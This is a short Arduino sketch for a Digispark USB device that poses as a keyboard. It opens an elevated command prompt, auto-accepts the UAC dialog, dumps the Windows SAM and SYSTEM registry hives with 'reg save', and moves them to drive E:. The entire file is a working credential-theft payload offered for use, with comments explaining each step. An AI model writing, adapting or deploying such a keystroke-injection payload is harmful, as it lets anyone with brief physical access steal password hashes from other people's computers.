#include "DigiKeyboard.h"

void setup() {
  //empty
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //do i need to explain what this does
  DigiKeyboard.delay(400);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); //opens cmd as administrator
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1300);
  DigiKeyboard.print("reg save HKLM\\SAM sam.rsave");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("reg save HKLM\\system system.rsave");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("move *.rsave E:/"); // REMOVE TO PREVENT FILE MOVE
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // REMOVE TO PREVENT FILE MOVE
}